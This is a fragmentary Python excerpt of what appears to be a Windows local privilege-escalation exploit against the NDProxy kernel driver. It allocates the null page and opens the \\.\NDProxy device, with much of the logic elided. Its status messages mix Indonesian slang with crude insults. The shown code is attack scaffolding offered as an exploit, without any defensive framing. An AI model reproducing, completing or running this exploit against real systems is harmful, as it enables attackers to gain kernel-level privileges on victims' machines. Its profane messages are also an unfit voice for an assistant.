...
def ND_ND_PROXY():
    ...
    print("[*] Kelemahan Di temukan di alur liar :D")
    ...
    if dwStatus!=STATUS_SUCCESS:
        print("[!] Somethin When Wrong Like A Pussy My Brotha. Null Page Memory nya : %s"%dwStatus)
        DapatkanError()
    written=c_ulong()
    ...
    if alloc==0:
        print("[!] Something Wrong Again GOBLOK. Junk Memory nya dull! kebesaran!!! %s"%alloc)
        DapatkanError()
    dwRetBytes=DWORD(0)
    DEVICE_NAME="\\\\.\\NDProxy"
    hdev=kernel32.CreateFileA(DEVICE_NAME,0,0,None,OPEN_EXISTING,0,None)
    if hdev==-1:
        print("[!] Tidak Bisa Membuka Device Nya :( ")
        sys.exit()
